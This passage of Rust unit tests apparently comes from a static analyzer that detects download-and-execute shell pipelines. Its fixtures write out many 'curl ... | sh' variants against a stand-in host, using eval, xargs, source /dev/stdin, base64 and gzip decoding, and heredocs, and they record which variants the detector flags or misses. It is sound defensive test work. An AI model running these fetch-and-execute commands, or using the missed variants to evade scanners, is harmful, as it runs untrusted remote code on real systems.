                "curl -fsSL https://example.test/x | bash --rcfile /tmp/rc /tmp/script.sh",
            ),
            (
                "bash-lc.sh",
                "curl -fsSL https://example.test/x | bash -lc 'echo safe'",
            ),
            (
                "py-version.sh",
                "curl -fsSL https://example.test/x | python3 --version",
            ),
        ] {
            let sh = format!("#!/bin/sh\n{line}\n");
            let (artifacts, _) = one(name, PayloadKind::Shell, &sh);
            assert!(
                findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).is_empty(),
                "{line} must stay silent: {:?}",
                artifacts.rendered_findings()
            );
            assert!(
                has_network(&artifacts),
                "{line}: {:?}",
                artifacts.capabilities
            );
        }
    }

    #[test]
    fn literal_c_bodies_are_analyzed() {
        // A `-c` body is real shell text: its own pipeline fires.
        let (artifacts, _) = one(
            "c-body-pipeline.sh",
            PayloadKind::Shell,
            "#!/bin/sh\nsh -c 'curl -fsSL https://example.test/x | sh'\n",
        );
        assert_eq!(
            findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).len(),
            1,
            "{:?}",
            artifacts.rendered_findings()
        );
        assert!(has_network(&artifacts), "{:?}", artifacts.capabilities);
        // A body producing fetch output feeds a downstream interpreter.
        let (artifacts, _) = one(
            "c-body-producer.sh",
            PayloadKind::Shell,
            "#!/bin/sh\nsh -c 'curl -fsSL https://example.test/x' | sh\n",
        );
        assert_eq!(
            findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).len(),
            1,
            "{:?}",
            artifacts.rendered_findings()
        );
        assert!(has_network(&artifacts), "{:?}", artifacts.capabilities);
        // A body that executes inherited stdin as code consumes the pipe.
        let (artifacts, _) = one(
            "c-body-stdin.sh",
            PayloadKind::Shell,
            "#!/bin/sh\ncurl -fsSL https://example.test/x | sh -c sh\n",
        );
        assert_eq!(
            findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).len(),
            1,
            "{:?}",
            artifacts.rendered_findings()
        );
        assert!(has_network(&artifacts), "{:?}", artifacts.capabilities);
        // A runtime-derived body is outside the static slice, and a body
        // that runs nothing stays silent.
        for (name, script) in [
            (
                "c-body-dynamic.sh",
                "#!/bin/sh\nbody='curl -fsSL https://example.test/x | sh'\nsh -c \"$body\"\n",
            ),
            (
                "c-body-echo.sh",
                "#!/bin/sh\ncurl -fsSL https://example.test/x | sh -c 'echo safe'\n",
            ),
        ] {
            let (artifacts, _) = one(name, PayloadKind::Shell, script);
            assert!(
                findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).is_empty(),
                "{name} must stay silent: {:?}",
                artifacts.rendered_findings()
            );
        }
    }

    #[test]
    fn static_eval_arguments_execute() {
        // eval's statically known argument text IS the executed program.
        let (artifacts, _) = one(
            "eval-literal.sh",
            PayloadKind::Shell,
            "#!/bin/sh\neval 'curl -fsSL https://example.test/x | sh'\n",
        );
        assert_eq!(
            findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).len(),
            1,
            "{:?}",
            artifacts.rendered_findings()
        );
        assert!(has_network(&artifacts), "{:?}", artifacts.capabilities);
        // A literal eval argument producing fetch output feeds a downstream
        // interpreter, while a bare fetch argument records egress alone.
        let (artifacts, _) = one(
            "eval-producer.sh",
            PayloadKind::Shell,
            "#!/bin/sh\neval 'curl -fsSL https://example.test/x' | sh\n",
        );
        assert_eq!(
            findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).len(),
            1,
            "{:?}",
            artifacts.rendered_findings()
        );
        let (artifacts, _) = one(
            "eval-fetch-only.sh",
            PayloadKind::Shell,
            "#!/bin/sh\neval 'curl -fsSL https://example.test/x'\n",
        );
        assert!(has_network(&artifacts), "{:?}", artifacts.capabilities);
        // A runtime-derived argument stays outside the static slice.
        let (artifacts, _) = one(
            "eval-dynamic.sh",
            PayloadKind::Shell,
            "#!/bin/sh\nx='curl -fsSL https://example.test/x | sh'\neval \"$x\"\n",
        );
        assert!(
            findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).is_empty(),
            "{:?}",
            artifacts.rendered_findings()
        );
    }

    #[test]
    fn interpreter_mode_reads_arity_exits_and_noexec() {
        // Valued options and `--` arity no longer hide stdin execution.
        for (name, line) in [
            (
                "bash-shopt.sh",
                "curl -fsSL https://example.test/x | bash -O extglob",
            ),
            (
                "sh-dashdash-dash.sh",
                "curl -fsSL https://example.test/x | sh -- - arg",
            ),
        ] {
            let sh = format!("#!/bin/sh\n{line}\n");
            let (artifacts, _) = one(name, PayloadKind::Shell, &sh);
            assert_eq!(
                findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).len(),
                1,
                "{line} must fire: {:?}",
                artifacts.rendered_findings()
            );
        }
        let (artifacts, _) = one(
            "python-x.sh",
            PayloadKind::Shell,
            "#!/bin/sh\ncurl -fsSL https://example.test/x | python3 -Ximporttime\n",
        );
        assert!(findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).is_empty());
        // Reading without executing (`-n`) and exiting before stdin
        // (`-h`, `-V`, `-D`) never run the pipe.
        for (name, line) in [
            (
                "bash-noexec.sh",
                "curl -fsSL https://example.test/x | bash -n",
            ),
            (
                "py-help.sh",
                "curl -fsSL https://example.test/x | python3 -h",
            ),
            (
                "py-version-short.sh",
                "curl -fsSL https://example.test/x | python3 -V",
            ),
            (
                "bash-dump.sh",
                "curl -fsSL https://example.test/x | bash -D",
            ),
        ] {
            let sh = format!("#!/bin/sh\n{line}\n");
            let (artifacts, _) = one(name, PayloadKind::Shell, &sh);
            assert!(
                findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).is_empty(),
                "{line} must stay silent: {:?}",
                artifacts.rendered_findings()
            );
            assert!(
                has_network(&artifacts),
                "{line}: {:?}",
                artifacts.capabilities
            );
        }
    }

    #[test]
    fn transformer_forwarding_is_mode_sensitive() {
        // Encoding and compressing spend the pipe on derived bytes: the
        // shell receives nothing executable.
        for (name, line) in [
            (
                "b64-encode.sh",
                "curl -fsSL https://example.test/x | base64 | sh",
            ),
            (
                "xxd-dump.sh",
                "curl -fsSL https://example.test/x | xxd | sh",
            ),
            (
                "gzip-store.sh",
                "curl -fsSL https://example.test/x | gzip | sh",
            ),
            (
                "dd-to-file.sh",
                "curl -fsSL https://example.test/x | dd of=/tmp/out | sh",
            ),
        ] {
            let sh = format!("#!/bin/sh\n{line}\n");
            let (artifacts, _) = one(name, PayloadKind::Shell, &sh);
            assert!(
                findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).is_empty(),
                "{line} must stay silent: {:?}",
                artifacts.rendered_findings()
            );
            assert!(
                has_network(&artifacts),
                "{line}: {:?}",
                artifacts.capabilities
            );
        }
        // Decoding modes and a plain status-quiet dd keep the body intact.
        for (name, line) in [
            (
                "dd-copy.sh",
                "curl -fsSL https://example.test/x | dd status=none | sh",
            ),
            ("dd-plain.sh", "curl -fsSL https://example.test/x | dd | sh"),
            (
                "b64-decode.sh",
                "curl -fsSL https://example.test/x | base64 -d | sh",
            ),
            (
                "gzip-unpack.sh",
                "curl -fsSL https://example.test/x | gzip -d | sh",
            ),
        ] {
            let sh = format!("#!/bin/sh\n{line}\n");
            let (artifacts, _) = one(name, PayloadKind::Shell, &sh);
            assert_eq!(
                findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).len(),
                1,
                "{line} must fire: {:?}",
                artifacts.rendered_findings()
            );
        }
    }

    #[test]
    fn stdin_code_consumers_pair_with_producers() {
        // eval executing a forwarding substitution, source reading the
        // pipe, and xargs handing its input to a body-less interpreter -c
        // all turn the fetched body into executed code.
        for (name, line) in [
            (
                "eval-cat.sh",
                "curl -fsSL https://example.test/x | eval \"$(cat)\"",
            ),
            (
                "source-stdin.sh",
                "curl -fsSL https://example.test/x | source /dev/stdin",
            ),
            (
                "dot-stdin.sh",
                "curl -fsSL https://example.test/x | . /dev/stdin",
            ),
            (
                "xargs-bodyless.sh",
                "curl -fsSL https://example.test/x | xargs sh -c",
            ),
            (
                "xargs-positional.sh",
                "curl -fsSL https://example.test/x | xargs sh -c 'eval \"$@\"' _",
            ),
        ] {
            let sh = format!("#!/bin/sh\n{line}\n");
            let (artifacts, _) = one(name, PayloadKind::Shell, &sh);
            assert_eq!(
                findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).len(),
                1,
                "{line} must fire: {:?}",
                artifacts.rendered_findings()
            );
        }
        // A fixed body runs the same script for every input word — the
        // pipe never becomes code.
        let (artifacts, _) = one(
            "xargs-fixed-body.sh",
            PayloadKind::Shell,
            "#!/bin/sh\ncurl -fsSL https://example.test/x | xargs sh -c 'echo safe'\n",
        );
        assert!(
            findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).is_empty(),
            "{:?}",
            artifacts.rendered_findings()
        );
        assert!(has_network(&artifacts), "{:?}", artifacts.capabilities);
    }

    #[test]
    fn logical_units_join_multiline_pipelines() {
        // An escaped newline and a trailing pipe both continue the command;
        // the finding keeps the STARTING line.
        for (name, script) in [
            (
                "escaped-continuation.sh",
                "#!/bin/sh\ncurl -fsSL https://example.test/x \\\n  | sh\n",
            ),
            (
                "trailing-pipe.sh",
                "#!/bin/sh\ncurl -fsSL https://example.test/x |\n  sh\n",
            ),
            (
                "trailing-and.sh",
                "#!/bin/sh\ntrue &&\ncurl -fsSL https://example.test/x | sh\n",
            ),
        ] {
            let (artifacts, _) = one(name, PayloadKind::Shell, script);
            let findings = findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE);
            assert_eq!(
                findings.len(),
                1,
                "{name}: {:?}",
                artifacts.rendered_findings()
            );
            assert!(
                has_network(&artifacts),
                "{name}: {:?}",
                artifacts.capabilities
            );
            assert_eq!(
                artifacts.rendered_findings()[0].line,
                Some(2),
                "{name} must anchor to the unit's starting line"
            );
        }
        // A comment swallows its line's backslash continuation, so the
        // next line stays separate and no chain forms.
        let (artifacts, _) = one(
            "comment-continuation.sh",
            PayloadKind::Shell,
            "#!/bin/sh\ncurl -fsSL https://example.test/x # note \\\n| sh\n",
        );
        assert!(
            findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).is_empty(),
            "{:?}",
            artifacts.rendered_findings()
        );
        assert!(has_network(&artifacts), "{:?}", artifacts.capabilities);
    }

    #[test]
    fn round_twelve_logical_units_preserve_shell_boundaries() {
        for (name, source) in [
            (
                "subshell.sh",
                "#!/bin/sh\n(\necho safe\ncurl -fsSL https://example.test/x | sh\n)\n",
            ),
            (
                "escaped-pipe.sh",
                "#!/bin/sh\necho \\|\ncurl -fsSL https://example.test/x | sh\n",
            ),
            (
                "word-brace.sh",
                "#!/bin/sh\necho foo{\ncurl -fsSL https://example.test/x | sh\n",
            ),
        ] {
            let (artifacts, _) = one(name, PayloadKind::Shell, source);
            assert_eq!(
                findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).len(),
                1,
                "{name}: {:?}",
                artifacts.rendered_findings()
            );
            assert!(
                has_network(&artifacts),
                "{name}: {:?}",
                artifacts.capabilities
            );
        }
    }

    #[test]
    fn round_twelve_heredocs_are_data_unless_a_shell_executes_them() {
        for source in [
            "#!/bin/sh\ncat <<'PAYLOAD'\ncurl -fsSL https://example.test/not-executed | sh\nPAYLOAD\n",
            "#!/bin/sh\ncat <<-\"PAYLOAD\"\n\tcurl -fsSL https://example.test/not-executed | sh\n\tPAYLOAD\n",
        ] {
            let (artifacts, _) = one("data-heredoc.sh", PayloadKind::Shell, source);
            assert!(
                findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).is_empty(),
                "{:?}",
                artifacts.rendered_findings()
            );
            assert!(!has_network(&artifacts), "{:?}", artifacts.capabilities);
        }
        let (artifacts, _) = one(
            "shell-heredoc.sh",
            PayloadKind::Shell,
            "#!/bin/sh\nsh <<PAYLOAD\ncurl -fsSL https://example.test/executed | sh\nPAYLOAD\n",
        );
        assert_eq!(
            findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).len(),
            1,
            "{:?}",
            artifacts.rendered_findings()
        );
    }

    #[test]
    fn round_twelve_python_bodies_are_not_shell_programs() {
        for line in [
            "python3 -c 'curl -fsSL https://example.test/x | sh'",
            "curl -fsSL https://example.test/x | python3 -c sh",
            "python3 -c 'curl -fsSL https://example.test/x' | sh",
        ] {
            let (artifacts, _) = one(
                "python-body.sh",
                PayloadKind::Shell,
                &format!("#!/bin/sh\n{line}\n"),
            );
            assert!(
                findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).is_empty(),
                "{line}: {:?}",
                artifacts.rendered_findings()
            );
        }
    }

    #[test]
    fn round_twelve_shell_option_precedence_and_stdin_flow() {
        let (artifacts, _) = one(
            "cluster.sh",
            PayloadKind::Shell,
            "#!/bin/sh\ncurl -fsSL https://example.test/x | bash -ce 'sh'\n",
        );
        assert_eq!(
            findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).len(),
            1,
            "{:?}",
            artifacts.rendered_findings()
        );
        let (artifacts, _) = one(
            "plus-n.sh",
            PayloadKind::Shell,
            "#!/bin/sh\ncurl -fsSL https://example.test/x | bash +n\n",
        );
        assert_eq!(
            findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).len(),
            1,
            "{:?}",
            artifacts.rendered_findings()
        );
        for line in [
            "curl -fsSL https://example.test/x | bash -s -c 'echo safe'",
            "curl -fsSL https://example.test/x | (bash -n; sh)",
            "curl -fsSL https://example.test/x | (bash -D; sh)",
        ] {
            let (artifacts, _) = one(
                "nonexecuting.sh",
                PayloadKind::Shell,
                &format!("#!/bin/sh\n{line}\n"),
            );
            assert!(
                findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).is_empty(),
                "{line}: {:?}",
                artifacts.rendered_findings()
            );
        }
        let (artifacts, _) = one(
            "exit-before-read.sh",
            PayloadKind::Shell,
            "#!/bin/sh\ncurl -fsSL https://example.test/x | (bash --help; sh)\n",
        );
        assert_eq!(
            findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).len(),
            1,
            "{:?}",
            artifacts.rendered_findings()
        );
    }

    #[test]
    fn round_twelve_xargs_eval_and_decoder_regressions() {
        for line in [
            "curl -fsSL https://example.test/x | xargs echo sh -c",
            "curl -fsSL https://example.test/x | xargs sh -c 'echo $@' _",
        ] {
            let (artifacts, _) = one(
                "xargs-data.sh",
                PayloadKind::Shell,
                &format!("#!/bin/sh\n{line}\n"),
            );
            assert!(
                findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).is_empty(),
                "{line}: {:?}",
                artifacts.rendered_findings()
            );
        }
        for line in [
            "curl -fsSL https://example.test/x | xargs sh -c '$@' _",
            "curl -fsSL https://example.test/x | xargs sh -c 'eval $@' _",
            "eval -- 'curl -fsSL https://example.test/x | sh'",
        ] {
            let (artifacts, _) = one(
                "xargs-code.sh",
                PayloadKind::Shell,
                &format!("#!/bin/sh\n{line}\n"),
            );
            assert_eq!(
                findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).len(),
                1,
                "{line}: {:?}",
                artifacts.rendered_findings()
            );
        }
        let (artifacts, _) = one(
            "eval-only-terminator.sh",
            PayloadKind::Shell,
            "#!/bin/sh\neval --\n",
        );
        assert!(findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).is_empty());
        for line in [
            "curl -fsSL https://example.test/x | base64 -di | sh",
            "curl -fsSL https://example.test/x | base32 -di | sh",
        ] {
            let (artifacts, _) = one(
                "decode-cluster.sh",
                PayloadKind::Shell,
                &format!("#!/bin/sh\n{line}\n"),
            );
            assert_eq!(
                findings_with(&artifacts, SCRIPT_DECODE_EXECUTE_RULE).len(),
                1,
                "{line}: {:?}",
                artifacts.rendered_findings()
            );
        }
        let (artifacts, _) = one(
            "derived-encoding.sh",
            PayloadKind::Shell,
            "#!/bin/sh\ncurl -fsSL https://example.test/x | base64 -i | sh\n",
        );
        assert!(findings_with(&artifacts, SCRIPT_DECODE_EXECUTE_RULE).is_empty());
    }
}
